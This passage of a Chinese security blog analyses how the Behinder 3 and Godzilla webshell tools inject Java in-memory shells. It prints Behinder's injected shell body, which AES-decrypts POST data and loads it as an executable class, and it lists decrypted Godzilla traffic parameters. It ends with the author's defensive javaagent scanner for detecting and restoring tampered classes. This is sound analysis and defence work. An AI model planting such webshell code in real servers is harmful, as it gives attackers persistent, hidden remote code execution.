### 4）、冰蝎中的内存马实现
貌似现在能找到的内存马的参考和学习文章，最早就是追溯到冰蝎的作者rebeyond师傅在18年写的一个叫memshell的项目，该项目主要讲到利用javaagent技术实现内存马，因此后续的冰蝎中内存马的实现也是使用的javaagent技术实现的，而没有使用动态注册的方式来实现：
下面我们通过分析冰蝎3源码来看看冰蝎中内存马的具体实现：
在MainController中的loadContextMenu方法中实现对注入内存马按钮的初始化，接下来我们找到该button的点击响应方法的实现即可
找到保存并注入按钮的点击动作的实现：
1、首先我们可以看到冰蝎3中的内存马中有放检测这一选项，这个在这里先提一下，后续在检测的查杀技术里面详细说。
2、saveBtn的setOnAction中主要实现逻辑是有injectMemShell来实现了的
接下来我们跟进injectMemShell方法，在该方法的实现中
接下来我们具体找到其agent.jar文件，在net/rebeyond/behinder/resource/tools 目录中：
可以看到上面四个jar文件分别对应：Windows、Linux 、 Unix 、Mac
这里我们看下windows的：
使用xjad反编译tools_0.jar：
反编译之后查看Memshell实现：
在其agentmain方法里面对相关组件进行判断，从而选择不同的类，并写入入shellcode：
shellcode是写死在里面的，不同的方法里面做一些简单的替换即可：
    javax.servlet.http.HttpServletRequest request=(javax.servlet.ServletRequest)$1;
    javax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse)$2;
    javax.servlet.http.HttpSession session = request.getSession();
    String pathPattern="%s";
    if (request.getRequestURI().matches(pathPattern))
    {
        java.util.Map obj=new java.util.HashMap();
        obj.put("request",request);
        obj.put("response",response);
        obj.put("session",session);
        ClassLoader loader=this.getClass().getClassLoader();
        if (request.getMethod().equals("POST"))
        {
            try
            {
                String k="%s";
                session.putValue("u",k);
                java.lang.ClassLoader systemLoader=java.lang.ClassLoader.getSystemClassLoader();
                Class cipherCls=systemLoader.loadClass("javax.crypto.Cipher");
                Object c=cipherCls.getDeclaredMethod("getInstance",new Class[]{String.class}).invoke((java.lang.Object)cipherCls,new Object[]{"AES"});
                Object keyObj=systemLoader.loadClass("javax.crypto.spec.SecretKeySpec").getDeclaredConstructor(new Class[]{byte[].class,String.class}).newInstance(new Object[]{k.getBytes(),"AES"});;
                java.lang.reflect.Method initMethod=cipherCls.getDeclaredMethod("init",new Class[]{int.class,systemLoader.loadClass("java.security.Key")});
                initMethod.invoke(c,new Object[]{new Integer(2),keyObj});
                java.lang.reflect.Method doFinalMethod=cipherCls.getDeclaredMethod("doFinal",new Class[]{byte[].class});
                byte[] requestBody=null;
                try {
                        Class Base64 = loader.loadClass("sun.misc.BASE64Decoder");
                        Object Decoder = Base64.newInstance();
                        requestBody=(byte[]) Decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});
                    } catch (Exception ex) 
                    {
                        Class Base64 = loader.loadClass("java.util.Base64");
                        Object Decoder = Base64.getDeclaredMethod("getDecoder",new Class[0]).invoke(null, new Object[0]);
                        requestBody=(byte[])Decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(Decoder, new Object[]{request.getReader().readLine()});
                    }
                byte[] buf=(byte[])doFinalMethod.invoke(c,new Object[]{requestBody});
                java.lang.reflect.Method defineMethod=java.lang.ClassLoader.class.getDeclaredMethod("defineClass", new Class[]{String.class,java.nio.ByteBuffer.class,java.security.ProtectionDomain.class});
                defineMethod.setAccessible(true);
                java.lang.reflect.Constructor constructor=java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]{java.lang.ClassLoader.class});
                constructor.setAccessible(true);
                java.lang.ClassLoader cl=(java.lang.ClassLoader)constructor.newInstance(new Object[]{loader});
                java.lang.Class  c=(java.lang.Class)defineMethod.invoke((java.lang.Object)cl,new Object[]{null,java.nio.ByteBuffer.wrap(buf),null});
                c.newInstance().equals(obj);
            }
            catch(java.lang.Exception e)
            {
               e.printStackTrace();
            }
            catch(java.lang.Error error)
            {
            error.printStackTrace();
            }
            return;
        }   
    }
可以看到其实现的cmdshell还是使用的是冰蝎加密的那一套。
最后的话是配合javassist来实现运行时动态字节码修改，需要注意的是这里使用Instrumentation的redefineclasses方法，和上文介绍javaagent技术小demo使用的是相同的，同时这里选取的通用类是jakarta.servlet.http.HttpServlet：
并且其doAgentShell里面实现了上文提及的attach注入：
以上便是冰蝎3的内存马实现，是通过agent注入来实现的，最早是18年冰蝎的作者rebeyond在其memshell项目项目中用到，后续被融入进冰蝎客中；如下图是memshell项目中agent的实现：
可以看到memshell项目中调用的是Instrumentation.retransformClasses()方法来实现的，而上文中也有提及现在的冰蝎3却不是这样的，是通过Instrumentation.redefineClasses方法实现的，那么为什么这里要发生改变了，是两个随便用吗？
这里面就涉及到agent技术本身以及内存马的检测的一些问题了，下面内存马的检测里面展开说
### 5）、哥斯拉中的内存马实现
哥斯拉是继冰蝎之后的一款主流webshell管理客户端，好像是当时和冰蝎三出来的时间差不多，影响里面是20年下边年护网的前不久出来的，当时我还在实习，其本质也是由于冰蝎2因其强特征太明显当时被各种ids、waf乱杀，于是哥斯拉便被大佬创造出来了，听另一个靓仔讲，哥斯拉的作者好像专科还没毕业就写出来哥斯拉了，丢，非人哉，回想我之前大三大四还在用java做加密器，学msf，cs的使用，还在用蚁剑、中国菜刀.........
下面结合哥斯拉源码和哥斯拉流量简单分析下内存马在哥斯拉中的实现：
抓取哥斯拉注入内存马以及卸载内存马流量：
抓取的流量主要分为三大部分：
  * 1、哥斯拉的首次加载使用的payload类，并初始化
  * 2、注入内存马
  * 3、卸载内存马
和冰蝎不同哥斯拉并不是每次都发送一个构造好的payload：如下图是冰蝎java的payload的类型，其中BasicInfo是首次加载使用的基础信息获取：
哥斯拉的模式是，第一次基本加载全部功能要使用payload到服务端中session中存储并使用，所以在首次连接的时候发送的加密流量会比较大，后续的话就基本就是加密传输相关函数名和参数调用，来完成。
1、首先我们来看下首次加载产生的加密流量：如图
这里我简单研究了下哥斯拉的请求流量和响应流量的加密逻辑，自己写了一个解密工具：[WebShellDecoder](https://github.com/minhangxiaohui/DecodeSomeJSPWebshell)，健壮性有待提升但是实现基本的加密流量解密没什么问题；项目地址：
使用WebShell解密工具解密：
解密后拿到的其实就是第一次加载使用的payload的字节码文件，工具做了下还原生成eval.class文件，直接丢到idea反编译看下：
这个类叫NullsFailProvider和冰蝎实现payload一样，里面重写了equal和toString等方法来用于命令执行以及回显，但不同的是其继承了Classload类，通过其继承的defineClass方法可以来实现任意恶意字节码恶意类的对象实例的获取（可能会有人会疑惑为什么要这么做，服务端（木马）的实现不就是这样的吗，为啥发送的payload类还要这样做？这是因为下面为了对接统一管理，在服务端实现中当非首次加载的时候服务器端判读不是首次加载则不会做特殊处理，所以我们后续如果要扩展或者添加恶意类那么就只能通过这个来实现了）。还就是这里面很长很多的方法，基本涵盖了哥斯拉要是有的大部分功能：
其实现的方法有：
2、加载内存马时，客户端发往服务器的请求流量：
解密请求流量：
可以看到解密后得到了三个字段：
codeName=org.apache.coyote.node.NumericNode  
binCode=还原文件根目录下:binCodeEval.class  
methodName=include
其中bincode为一个新的字节码文件，并且已被还原为binCodeEval.class：
跟进首次加载的inlude()方法：可以看到首先获取bincode传入的恶意字节码并利用NullsFailProvider继承ClassLoader的特性，来实现新的恶意类的获取，可以看到哥斯拉在做加载内存马的准备工作的时候加载了新的恶意类。
其新恶意类内容如下，叫NumericNode类：
后续接着捕获到客户端请求流量：
解密后：
传入了5个参数：
  * secretKey=3c6e0b8a9c15224a
  * path=/myshell
  * evalClassName=org.apache.coyote.node.NumericNode
  * methodName=run
  * pwd=password
可以看到是调用run方法：从session中读出来之前存的NumericNode对象并实例化，然后调用其equal方法和toString方法，最后将结果传回session中的result：
跟进NumericNode类的equals和toStirng方法：
equals:该方法里面主要是获取内存马注入要的东西，其中有上下文环境ServletContext以及密码密钥和路径
toString方法：该方法中就是调用了addServlet（）方法：
跟进addServlet方法：这里实现了动态添加Servlet的逻辑，和上文提到的第一种动态添加servlet组件来实现的内存马的实现基本一致。
后面还有卸载，卸载和添加的原理是一样的，删除掉该servlet所在的Wrapper对象即可。
以上是哥斯拉内存马的实现；可以看到哥斯拉和冰蝎实现内存马的方式是不一样的，哥斯拉选择的是动态注册Servlet组件来实现内存马的注入，而冰蝎则是通过javaagent技术配合javassist技术来实现内存马的注入。
## 3、内存马的检测、查杀技术
### 检测&清除
#### 1）、第三类内存马，agent型内存马的检测和查杀
在思考内存马检测技术的时候，当时我第一反应就是javaagent技术，上文写到第三类内存马javaagent技术的实现的时候，有还原被注入后的字节码，以此类推那既然javaagent技术配合javassist技术能动态的获取到内存中字节码，那我们对关键类的字节码做一个校验、或过滤是不是就可以检测到第三类内存马了呢？
>
> 答案是：一半对，一半错；上文有提到agent型的内存马出现过两个形式，一个是18年rebeyond师傅在memshell项目中使用的Instrumentation.retransformerClasses来实现的，一个是现在冰蝎3中调用Instrumentation.redefineclasses方法实现了，这两个的实现途径的区别就是被redefineClasses方法重载过的类，其重载后的类的字节码无法在下一次调用redefineClasses或retransformClasses中获取到，所以我们就没办法获取到其字节码并做过滤以及检测；但是被retransformClasses方法重载后的类，该类的字节码可以被下次重载时调用，这也是为什么最后冰蝎在其agent内存马实现的时候使用redefineClass方法的原因，这样可以躲避javaagent技术实现的查杀。
这里我们先不谈redefineClasses实现的agent型内存马，先说retransformClasses的检测和查杀的实现：
正如上面说的，既然retransformClasses实现的内存马在下一次重载的时候我们可以获取到其真实的修改后的字节码，那我们检测的时候可以，检测一些Tomcat或相关容器中常见的统用类的通用方法，如上文提到的
ApplicationFilterChain类的dointernalFilter方法：
下面我们利用javaagent本身来检测并查杀上文中实现的第三种内存马，也就是retranformClasses方法实现的agent型内存马:
**写的时候这里我就直接针对ApplicationFilterChain类的dointernalFilter来检测和查杀：**
这里写了一个[demo项目](https://github.com/minhangxiaohui/Memshel_Scanner)地址：
查杀使用的Agent：这里使用的Agent和上文实现agent型内存马原理是一致的
    package priv.ga0weI.scannerbaseonagent;
    import java.lang.instrument.Instrumentation;
    public class Agentthings {
        public static  void  agentmain(String Args, Instrumentation inst) throws Exception {
    //
            MyTransformer myTransformer=new MyTransformer();
            inst.addTransformer(myTransformer,true);
            for (Class aclass:inst.getAllLoadedClasses()){
                if (aclass.getName().equals("org.apache.catalina.core.ApplicationFilterChain"))
                {
                    System.out.println("agent main:"+aclass.getName());
                    inst.retransformClasses(aclass);
    //                inst.removeTransformer(myTransformer);
                }
            }
        }
    }
查杀使用的Transformer：这里是查杀的主要逻辑点，由上文我们可知利用Instrumentation.retransformClasses()实现的agent型内存马，在下一次重载的时候可以从transform方法中接收到前一次重载修改后的字节码，这里是通过参数classfileBuffer来传递的，所以我们查杀的简单思路就是：
  * 1、获取传入的classfileBuffer参数，如果该处被更改实现了内存马，那么和最原始肯定不一样
  * 2、通过javassist获取对应要检测类的原始字节码（这里也就是 **org/apache/catalina/core/ApplicationFilterChain** 类）
  * 3、做一个对比，如果不一致就说明被重载过，这里我们也可以进一步匹配重载字节码里面是否存在一些敏感类的调用，如Runtime、ProcessBulider等最后来确定被载入了内存马，这里下面的demo中就不做这部分工作了，因为知道我们之前是使用agent注入重载ApplicationFilterChainreturn的dointernalFilter()方法，所以在这里我们直接替换成重新从javassist中取出来的该类的原始实现，从而实现了检查和修复的目的。
    package priv.ga0weI.scannerbaseonagent;
    import javassist.*;
    import java.io.File;
    import java.io.FileOutputStream;
    import java.lang.instrument.ClassFileTransformer;
    import java.lang.instrument.IllegalClassFormatException;
    import java.security.ProtectionDomain;
    public class MyTransformer implements ClassFileTransformer {
        @Override
        public byte[] transform(ClassLoader loader, String className, Class classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
    //        System.out.println("ga0weI"+className);
            if (className.equals("org/apache/catalina/core/ApplicationFilterChain")) {
               try {
                   ClassPool classPool = ClassPool.getDefault();
                   if(className!=null) {
                       ClassClassPath path = new ClassClassPath(className.getClass());
                       classPool.insertClassPath(path);
                   }
                   if (classBeingRedefined != null)
                   {
                       ClassClassPath path2 = new ClassClassPath(classBeingRedefined);
                       classPool.insertClassPath(path2);
                   }
    //               System.out.println("class name:"+className);
                   CtClass ctClass;
                   try {
                       ctClass = classPool.get("org.apache.catalina.core.ApplicationFilterChain");//对应类没有内存马则为null抛出异常
                   }catch (NotFoundException e){
                       System.out.println("no memshell in ApplicationFilterChain");
                       return classfileBuffer;
                   }
    //               CtMethod ctMethod=ctClass.getDeclaredMethod("internalDoFilter");
                   byte [] bytes = ctClass.toBytecode();
                   ctClass.defrost();
                   bytestoclass(bytes,".\\tmp\\getApplicationFilterChain.class"); //original class eval
                   bytestoclass(classfileBuffer,".\\tmp\\getclassfileBuffer.class");//changed class
                   System.out.println("class has been get at /tmp");
                   System.out.println("memshell recover");
                   return bytes;//recover
               }catch (Exception e){
    //               e.printStackTrace();
               }
            }
            return  classfileBuffer;
        }
        /**
         * get class
         * @param bytes
         */
        private void bytestoclass(byte [] bytes,String filename) {
            try{
                File file = new File(".\\tmp");
                if (!file.exists())
                    file.mkdir();
                FileOutputStream fos = new FileOutputStream(filename);
                fos.write(bytes);
                fos.flush();
                fos.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
查杀使用的Attach：这里使用的Attache和之前实现内存马时的原理一致
    package priv.ga0weI.scannerbaseonagent;
    import com.sun.tools.attach.VirtualMachine;
    import java.io.BufferedReader;